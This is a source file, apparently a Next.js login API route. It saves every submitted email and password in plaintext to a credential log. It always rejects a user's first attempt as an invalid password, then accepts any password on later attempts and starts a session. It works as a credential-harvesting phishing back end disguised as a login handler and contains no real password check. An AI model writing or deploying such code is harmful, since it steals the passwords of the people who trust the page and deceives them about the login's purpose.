import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { setSession } from "@/lib/session";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const email = typeof body.email === "string" ? body.email.trim() : "";
    const password = typeof body.password === "string" ? body.password : "";

    if (!email || !password) {
      return NextResponse.json(
        { error: "Email and password are required." },
        { status: 400 },
      );
    }

    await prisma.credentialLog.create({
      data: { email, password },
    });

    const loginState = await prisma.loginState.upsert({
      where: { email },
      create: { email, attemptCount: 0 },
      update: {},
    });

    if (loginState.attemptCount === 0) {
      await prisma.loginState.update({
        where: { email },
        data: { attemptCount: 1 },
      });

      return NextResponse.json(
        { error: "Invalid password try again" },
        { status: 401 },
      );
    }

    await prisma.loginState.update({
      where: { email },
      data: { attemptCount: loginState.attemptCount + 1 },
    });

    await setSession(email);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Login error:", error);
    return NextResponse.json(
      { error: "Something went wrong. Please try again." },
      { status: 500 },
    );
  }
}
